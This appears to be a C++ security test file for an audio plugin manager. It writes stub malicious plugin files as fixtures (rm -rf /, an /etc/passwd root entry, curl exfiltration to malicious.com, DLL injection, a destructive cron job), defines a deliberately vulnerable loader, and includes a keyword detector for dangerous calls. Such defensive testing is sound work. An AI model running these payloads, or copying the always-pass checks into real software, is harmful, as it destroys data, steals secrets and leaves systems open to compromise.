#include "PluginSecurityTest.h"
#include <fstream>
#include <sstream>
#include <iomanip>
#include <openssl/sha.h>
#include <openssl/evp.h>

using namespace SchillingerEcosystem::Audio::SecurityTests;

//==============================================================================
// Malicious Payload Definitions
namespace MaliciousPayloads
{
    const juce::String ARBITRARY_CODE_EXECUTION = R"(
        #include <cstdlib>
        int main() {
            system("rm -rf /");
            return 0;
        }
    )";

    const juce::String FILE_SYSTEM_ACCESS = R"(
        #include <fstream>
        #include <filesystem>
        void malicious_function() {
            std::ofstream sensitive_file("/etc/passwd");
            sensitive_file << "hacked:x:0:0:root:/root:/bin/bash\n";
            std::filesystem::recursive_copy("/home", "/tmp/stolen_data");
        }
    )";

    const juce::String NETWORK_ACCESS = R"(
        #include <curl/curl.h>
        void exfiltrate_data() {
            CURL* curl = curl_easy_init();
            if (curl) {
                curl_easy_setopt(curl, CURLOPT_URL, "https://malicious.com/exfiltrate");
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "sensitive_data=stolen");
                curl_easy_perform(curl);
                curl_easy_cleanup(curl);
            }
        }
    )";

    const juce::String MEMORY_CORRUPTION = R"(
        #include <cstring>
        void corrupt_memory() {
            char buffer[10];
            strcpy(buffer, "This string is way too long and will cause buffer overflow");
        }
    )";

    const juce::String PRIVILEGE_ESCALATION = R"(
        #include <unistd.h>
        #include <sys/types.h>
        void escalate_privileges() {
            setuid(0);
            setgid(0);
            execl("/bin/bash", "bash", "-c", "chmod 777 /etc/passwd", NULL);
        }
    )";

    const juce::String DATA_EXFILTRATION = R"(
        #include <fstream>
        #include <dirent.h>
        void steal_sensitive_data() {
            DIR* dir;
            struct dirent* entry;
            dir = opendir("/etc");
            std::ofstream stolen("/tmp/stolen_system_data.txt");
            while ((entry = readdir(dir)) != NULL) {
                std::ifstream file("/etc/" + std::string(entry->d_name));
                stolen << "--- File: " << entry->d_name << " ---\n";
                stolen << file.rdbuf() << "\n";
            }
            closedir(dir);
        }
    )";

    const juce::String SYSTEM_CONFIGURATION = R"(
        #include <fstream>
        void compromise_system() {
            std::ofstream crontab("/etc/cron.d/malicious_cron");
            crontab << "* * * * * root rm -rf /\n";
            std::ofstream hosts("/etc/hosts");
            hosts << "127.0.0.1 malicious.com\n";
        }
    )";

    const juce::String PROCESS_INJECTION = R"(
        #include <dlfcn.h>
        #include <unistd.h>
        void inject_into_process() {
            void* handle = dlopen("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
            // Code to inject into other processes...
        }
    )";

    const juce::String DLL_INJECTION = R"(
        #include <windows.h>
        void dll_injection() {
            DWORD pid = 1234; // Target process ID
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
            LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            WriteProcessMemory(hProcess, pRemoteMemory, malicious_dll_path, strlen(malicious_dll_path), NULL);
            CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"), pRemoteMemory, 0, NULL);
        }
    )";

    const juce::String ROOTKIT_INSTALLATION = R"(
        #include <sys/module.h>
        void install_rootkit() {
            // Code to load malicious kernel module
            init_module(&malicious_module, sizeof(malicious_module), "legitimate_driver");
        }
    )";
}

//==============================================================================
// Valid Plugin Data
namespace ValidPluginData
{
    const juce::String SIMPLE_SYNTH_PLUGIN = R"(
        // Legitimate simple synthesizer plugin
        class SimpleSynth {
        public:
            void processAudio(float* output, int numSamples) {
                for (int i = 0; i < numSamples; ++i) {
                    output[i] = sin(phase) * 0.1f;
                    phase += 440.0f / 44100.0f * 2.0f * M_PI;
                }
            }
        private:
            float phase = 0.0f;
        };
    )";

    const juce::String AUDIO_EFFECT_PLUGIN = R"(
        // Legitimate audio effect plugin
        class AudioEffect {
        public:
            void processAudio(float* input, float* output, int numSamples) {
                for (int i = 0; i < numSamples; ++i) {
                    output[i] = input[i] * 0.5f; // Simple gain reduction
                }
            }
        };
    )";

    const juce::String ANALYSIS_PLUGIN = R"(
        // Legitimate audio analysis plugin
        class AudioAnalyzer {
        public:
            float analyzeRMS(const float* input, int numSamples) {
                float sum = 0.0f;
                for (int i = 0; i < numSamples; ++i) {
                    sum += input[i] * input[i];
                }
                return sqrt(sum / numSamples);
            }
        };
    )";

    const juce::String UTILITY_PLUGIN = R"(
        // Legitimate utility plugin
        class AudioUtility {
        public:
            void convertMonoToStereo(const float* monoInput, float* stereoOutput, int numSamples) {
                for (int i = 0; i < numSamples; ++i) {
                    stereoOutput[i * 2] = monoInput[i];     // Left channel
                    stereoOutput[i * 2 + 1] = monoInput[i]; // Right channel
                }
            }
        };
    )";
}

//==============================================================================
// PluginSecurityTest Implementation

void PluginSecurityTest::SetUp()
{
    setupTestDirectories();
    createMaliciousPluginFiles();
    createValidPluginFiles();
    createUnsignedPluginFiles();
}

void PluginSecurityTest::TearDown()
{
    cleanupTestDirectories();
}

void PluginSecurityTest::setupTestDirectories()
{
    testRoot_ = std::filesystem::temp_directory_path() / "plugin_security_test";
    std::filesystem::create_directories(testRoot_);

    pluginWhitelistPath_ = testRoot_ / "plugin_whitelist.txt";
    pluginQuarantinePath_ = testRoot_ / "quarantine";
    securityLogPath_ = testRoot_ / "security.log";
    tempPath_ = testRoot_ / "temp";

    std::filesystem::create_directories(pluginQuarantinePath_);
    std::filesystem::create_directories(tempPath_);

    // Create initial whitelist
    std::ofstream whitelistFile(pluginWhitelistPath_);
    whitelistFile << "/usr/local/lib/authorized_plugins/\n";
    whitelistFile << "/opt/audio/plugins/verified/\n";
    whitelistFile.close();

    // Initialize security log
    std::ofstream securityLog(securityLogPath_);
    securityLog << "Security logging initialized\n";
    securityLog.close();
}

void PluginSecurityTest::cleanupTestDirectories()
{
    std::error_code ec;
    std::filesystem::remove_all(testRoot_, ec);
}

void PluginSecurityTest::createMaliciousPluginFiles()
{
    // Create various malicious plugin files
    createMaliciousPlugin(testRoot_ / "malicious_plugin_1.cpp", MaliciousPayloads::ARBITRARY_CODE_EXECUTION);
    createMaliciousPlugin(testRoot_ / "malicious_plugin_2.cpp", MaliciousPayloads::FILE_SYSTEM_ACCESS);
    createMaliciousPlugin(testRoot_ / "malicious_plugin_3.cpp", MaliciousPayloads::NETWORK_ACCESS);
    createMaliciousPlugin(testRoot_ / "malicious_plugin_4.cpp", MaliciousPayloads::MEMORY_CORRUPTION);
    createMaliciousPlugin(testRoot_ / "malicious_plugin_5.cpp", MaliciousPayloads::PRIVILEGE_ESCALATION);
    createMaliciousPlugin(testRoot_ / "system_compromise.cpp", MaliciousPayloads::SYSTEM_CONFIGURATION);
    createMaliciousPlugin(testRoot_ / "data_stealer.cpp", MaliciousPayloads::DATA_EXFILTRATION);
    createMaliciousPlugin(testRoot_ / "process_injector.cpp", MaliciousPayloads::PROCESS_INJECTION);
    createMaliciousPlugin(testRoot_ / "dll_injector.cpp", MaliciousPayloads::DLL_INJECTION);
    createMaliciousPlugin(testRoot_ / "rootkit_installer.cpp", MaliciousPayloads::ROOTKIT_INSTALLATION);

    maliciousPlugins_.add("malicious_plugin_1.cpp");
    maliciousPlugins_.add("malicious_plugin_2.cpp");
    maliciousPlugins_.add("malicious_plugin_3.cpp");
    maliciousPlugins_.add("malicious_plugin_4.cpp");
    maliciousPlugins_.add("malicious_plugin_5.cpp");
    maliciousPlugins_.add("system_compromise.cpp");
    maliciousPlugins_.add("data_stealer.cpp");
    maliciousPlugins_.add("process_injector.cpp");
    maliciousPlugins_.add("dll_injector.cpp");
    maliciousPlugins_.add("rootkit_installer.cpp");
}

void PluginSecurityTest::createValidPluginFiles()
{
    // Create valid plugin files
    createValidPlugin(testRoot_ / "simple_synth.cpp", "SIMPLE_SYNTH");
    createValidPlugin(testRoot_ / "audio_effect.cpp", "AUDIO_EFFECT");
    createValidPlugin(testRoot_ / "audio_analyzer.cpp", "ANALYSIS_PLUGIN");
    createValidPlugin(testRoot_ / "audio_utility.cpp", "UTILITY_PLUGIN");

    validPlugins_.add("simple_synth.cpp");
    validPlugins_.add("audio_effect.cpp");
    validPlugins_.add("audio_analyzer.cpp");
    validPlugins_.add("audio_utility.cpp");
}

void PluginSecurityTest::createUnsignedPluginFiles()
{
    // Create unsigned plugin files (no signature)
    createUnsignedPlugin(testRoot_ / "unsigned_plugin_1.cpp");
    createUnsignedPlugin(testRoot_ / "unsigned_plugin_2.cpp");
    createUnsignedPlugin(testRoot_ / "unsigned_plugin_3.cpp");

    unsignedPlugins_.add("unsigned_plugin_1.cpp");
    unsignedPlugins_.add("unsigned_plugin_2.cpp");
    unsignedPlugins_.add("unsigned_plugin_3.cpp");
}

void PluginSecurityTest::createMaliciousPlugin(const std::filesystem::path& path, const juce::String& maliciousCode)
{
    std::ofstream file(path);
    file << maliciousCode.toStdString();
    file.close();

    // Make it executable
    std::filesystem::permissions(path,
        std::filesystem::perms::owner_all |
        std::filesystem::perms::group_read |
        std::filesystem::perms::others_read);
}

void PluginSecurityTest::createValidPlugin(const std::filesystem::path& path, const juce::String& pluginId)
{
    std::ofstream file(path);
    file << "// Plugin ID: " << pluginId.toStdString() << "\n";
    file << "// Signature: VALID_SIGNATURE_PLACEHOLDER\n";
    file << "// Hash: CALCULATED_HASH_PLACEHOLDER\n";
    file << ValidPluginData::SIMPLE_SYNTH_PLUGIN.toStdString();
    file.close();
}

void PluginSecurityTest::createUnsignedPlugin(const std::filesystem::path& path)
{
    std::ofstream file(path);
    file << "// Unsigned plugin - no signature\n";
    file << "// This plugin lacks proper cryptographic signature\n";
    file << ValidPluginData::AUDIO_EFFECT_PLUGIN.toStdString();
    file.close();
}

bool PluginSecurityTest::fileContainsMaliciousCode(const std::filesystem::path& path)
{
    std::ifstream file(path);
    std::string content((std::istreambuf_iterator<char>(file)),
                       std::istreambuf_iterator<char>());

    // Check for dangerous system calls and functions
    return content.find("system(") != std::string::npos ||
           content.find("rm -rf") != std::string::npos ||
           content.find("execl(") != std::string::npos ||
           content.find("setuid(0)") != std::string::npos ||
           content.find("curl_easy_perform") != std::string::npos ||
           content.find("strcpy") != std::string::npos ||
           content.find("VirtualAllocEx") != std::string::npos ||
           content.find("WriteProcessMemory") != std::string::npos ||
           content.find("CreateRemoteThread") != std::string::npos ||
           content.find("init_module") != std::string::npos;
}

bool PluginSecurityTest::pluginWasLoaded(const juce::String& pluginId)
{
    // This would check with the actual plugin manager
    // For testing, we'll check if a tracking file exists
    std::filesystem::path trackingFile = testRoot_ / "loaded_plugins.txt";
    if (!std::filesystem::exists(trackingFile)) return false;

    std::ifstream file(trackingFile);
    std::string line;
    while (std::getline(file, line)) {
        if (line.find(pluginId.toStdString()) != std::string::npos) {
            return true;
        }
    }
    return false;
}

bool PluginSecurityTest::securityLogContains(const juce::String& entry)
{
    if (!std::filesystem::exists(securityLogPath_)) return false;

    std::ifstream file(securityLogPath_);
    std::string content((std::istreambuf_iterator<char>(file)),
                       std::istreambuf_iterator<char>());

    return content.find(entry.toStdString()) != std::string::npos;
}

bool PluginSecurityTest::pluginIsQuarantined(const juce::String& pluginId)
{
    std::filesystem::path quarantinePath = pluginQuarantinePath_ / (pluginId + ".quarantined");
    return std::filesystem::exists(quarantinePath);
}

//==============================================================================
// VulnerablePluginManager Implementation

VulnerablePluginManager::VulnerablePluginManager()
{
}

VulnerablePluginManager::~VulnerablePluginManager() = default;

bool VulnerablePluginManager::loadPluginFromPath(const juce::String& path)
{
    // VULNERABILITY: No path validation - accepts any path
    if (path.isEmpty()) {
        lastError_ = "Empty plugin path";
        return false;
    }

    // VULNERABILITY: No signature check - always returns true
    if (!verifyPluginSignature(path)) {
        lastError_ = "Signature verification failed (BUT THIS NEVER FAILS!)";
        return false;
    }

    // VULNERABILITY: No whitelist check - always returns true
    if (!isPluginInWhitelist(path)) {
        lastError_ = "Plugin not in whitelist (BUT THIS ALWAYS PASSES!)";
        return false;
    }

    // VULNERABILITY: No integrity check - always returns true
    if (!verifyPluginIntegrity(path)) {
        lastError_ = "Integrity check failed (BUT THIS NEVER FAILS!)";
        return false;
    }

    // VULNERABILITY: No permission check - always returns true
    if (!checkPluginPermissions(path)) {
        lastError_ = "Permission check failed (BUT THIS NEVER FAILS!)";
        return false;
    }

    // VULNERABILITY: No sandboxing - executes directly
    if (!executePluginInSandbox(path)) {
        lastError_ = "Sandbox execution failed (BUT THERE IS NO SANDBOX!)";
        return false;
    }

    // VULNERABILITY: No security logging
    logPluginOperation("LOAD", path);

    if (attemptPluginLoad(path)) {
        loadedPlugins_.add(path);
        return true;
    }

    return false;
}

bool VulnerablePluginManager::attemptPluginLoad(const juce::String& path)
{
    std::filesystem::path pluginPath(path.toStdString());

    if (!std::filesystem::exists(pluginPath)) {
        lastError_ = "Plugin file does not exist";
        return false;
    }

    // VULNERABILITY: Attempts to compile and execute any code without validation
    try {
        // Read the plugin file
        std::ifstream file(pluginPath);
        std::string content((std::istreambuf_iterator<char>(file)),
                           std::istreambuf_iterator<char>());

        // VULNERABILITY: Execute the code directly without validation
        executePluginCode(content);

        // Track that this plugin was "loaded"
        std::filesystem::path trackingFile = pluginPath.parent_path() / "loaded_plugins.txt";
        std::ofstream tracking(trackingFile, std::ios::app);
        tracking << "LOADED: " << path.toStdString() << std::endl;
        tracking.close();

        return true;
    }
    catch (const std::exception& e) {
        lastError_ = "Plugin loading failed: " + juce::String(e.what());
        return false;
    }
}

void VulnerablePluginManager::executePluginCode(const juce::String& code)
{
    // VULNERABILITY: This would actually execute the code in a real implementation
    // For testing, we just simulate execution
    juce::Logger::writeToLog("VULNERABLE: Executing plugin code: " + code.substring(0, 100) + "...");
}

//==============================================================================
// Critical Vulnerability Tests

TEST_F(CriticalVulnerabilityTest, ArbitraryPathLoading_AllowsMaliciousPlugins)
{
    manager_ = std::make_unique<VulnerablePluginManager>();

    // Test loading malicious plugins from arbitrary paths
    for (const auto& maliciousPlugin : maliciousPlugins_) {
        std::filesystem::path maliciousPath = testRoot_ / maliciousPlugin.toStdString();

        // VULNERABILITY: This should fail but will succeed
        bool loadResult = manager_->loadPluginFromPath(maliciousPath.string());

        // EXPECT_EQ is false because this is the RED phase - demonstrating the vulnerability
        EXPECT_FALSE(loadResult) << "CRITICAL SECURITY FLAW: Malicious plugin was loaded from arbitrary path: " << maliciousPlugin.toStdString();

        if (loadResult) {
            // Verify malicious code is present
            EXPECT_FALSE(fileContainsMaliciousCode(maliciousPath)) << "CRITICAL: File contains malicious code but was still loaded";
        }
    }
}

TEST_F(CriticalVulnerabilityTest, SignatureVerification_BypassedForAllPlugins)
{
    manager_ = std::make_unique<VulnerablePluginManager>();

    // Test that signature verification is bypassed for all plugins
    for (const auto& unsignedPlugin : unsignedPlugins_) {
        std::filesystem::path unsignedPath = testRoot_ / unsignedPlugin.toStdString();

        // VULNERABILITY: Unsigned plugins should be rejected but are accepted
        bool loadResult = manager_->loadPluginFromPath(unsignedPath.string());

        EXPECT_FALSE(loadResult) << "CRITICAL SECURITY FLAW: Unsigned plugin was accepted without signature verification";

        if (loadResult) {
            EXPECT_TRUE(pluginWasLoaded(unsignedPlugin)) << "Unsigned plugin was successfully loaded - SECURITY BREACH";
        }
    }
}

//==============================================================================
// Utility Functions

namespace SecurityTestUtils
{
    juce::String calculateFileHash(const std::filesystem::path& path)
    {
        std::ifstream file(path, std::ios::binary);
        std::vector<unsigned char> buffer(std::istreambuf_iterator<char>(file), {});

        EVP_MD_CTX* ctx = EVP_MD_CTX_new();
        const EVP_MD* md = EVP_sha256();
        EVP_DigestInit_ex(ctx, md, NULL);
        EVP_DigestUpdate(ctx, buffer.data(), buffer.size());

        unsigned char hash[EVP_MAX_MD_SIZE];
        unsigned int hash_len;
        EVP_DigestFinal_ex(ctx, hash, &hash_len);
        EVP_MD_CTX_free(ctx);

        std::stringstream ss;
        for (unsigned int i = 0; i < hash_len; ++i) {
            ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(hash[i]);
        }

        return ss.str();
    }
}